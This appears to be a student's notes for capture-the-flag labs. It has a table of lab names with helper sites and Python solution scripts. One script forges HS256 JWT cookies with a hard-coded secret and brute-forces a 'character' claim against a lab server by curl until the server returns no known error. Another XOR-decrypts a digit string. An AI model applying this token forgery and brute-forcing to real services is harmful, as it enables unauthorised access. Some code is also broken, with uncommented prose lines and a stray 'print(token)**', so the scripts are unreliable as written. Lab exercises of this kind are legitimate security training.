
# Documentatie
> - `Site-uri`
> - `Script-uri`

| Labs                                         | Site          |
|-----------------------------------------------|----------------------------|
|     Bank_account      |-|
|      Binary     |https://toolbox.itsec.tamu.edu/|
|       Cool_Dude    |https://www.dcode.fr/|
|     Double_Oh_No      |https://en.wikipedia.org/wiki/MI6     |
|      Labyrinth     |-|
|     PING      |-|
|      Shattered     |-|
|      Sudoku     | https://sudokuspoiler.com/sudoku/sudoku9  // https://www.dcode.fr/|
|     Tolkien Black      |-|
|Friend| https://crackstation.net/|


## __Script-uri__

# Script Tolkien
```
import jwt

payload = {
    "character": "admin",
    "tegridy": "weed"
}
secret = "chinpokomon"

token = jwt.encode(payload, secret, algorithm="HS256")

print(token)**
```
----
```
import jwt
import subprocess

Target info
URL = "http://141.85.224.116:8903/tolkien-black"
SECRET = "chinpokomon"

Characters to test
characters = [
    "randy", "Randy", "randy_marsh", "Randy Marsh", "cartman", "stan", "kyle",
    "butters", "kenny", "towelie", "chef", "ike", "garrison", "tolkien",
    "gerald", "sharon", "jimmy", "timmy", "barbrady", "mr. mackey", "pc principal"
]

Error phrases we want to skip
bad_responses = [
    "Wrong secret!",
    "Did you forget something?",
    "Hey, hey, where's your tegridy?",
    "Which South Park character are you?"
]

for character in characters:
    payload = {
        "character": character,
        "tegridy": "weed"
    }

    token = jwt.encode(payload, SECRET, algorithm="HS256")
    if isinstance(token, bytes):
        token = token.decode()

    print(f"[*] Trying: {character}...")

    # Build the curl command
    curl_command = [
        "curl", "-s", "-X", "POST", URL,
        "-H", f"Cookie: jwt={token}"
    ]

    # Run the command
    result = subprocess.run(curl_command, capture_output=True, text=True)
    response = result.stdout.strip()

    # Print response and stop if it's not a known error
    if not any(err in response for err in bad_responses):
        print(f"\n Success with character: {character}")
        print(" Server Response:\n")
        print(response)
        break
```
# Script Sudoku  
```
def xor_decrypt(ciphertext, key):
    key_bytes = [ord(c) for c in key]
    key_len = len(key_bytes)

    def split_by_n(text, n):
        return [text[i:i+n] for i in range(0, len(text), n)]

    try:
        bytes_2digit = [int(b) for b in split_by_n(ciphertext, 2)]
    except ValueError:
        bytes_2digit = []

    bytes_3digit = []
    if len(ciphertext) % 3 == 0:
        try:
            bytes_3digit = [int(b) for b in split_by_n(ciphertext, 3)]
        except ValueError:
            bytes_3digit = []

    def xor_bytes(byte_list):
        result_chars = []
        for i, b in enumerate(byte_list):
            key_byte = key_bytes[i % key_len]
            decrypted = b ^ key_byte
            if decrypted < 32 or decrypted > 126:
                return None
            result_chars.append(chr(decrypted))
        return ''.join(result_chars)

    decrypted_2 = None
    if bytes_2digit:
        decrypted_2 = xor_bytes(bytes_2digit)

    decrypted_3 = None
    if bytes_3digit:
        decrypted_3 = xor_bytes(bytes_3digit)

    return decrypted_2, decrypted_3

ciphertext = "279831654961745923435269871983172465714586392652493187198327546547618239326954718"
key = "God"

decrypted_2, decrypted_3 = xor_decrypt(ciphertext, key)

print("Decrypted assuming 2-digit bytes:", decrypted_2)
print("Decrypted assuming 3-digit bytes:", decrypted_3)
```

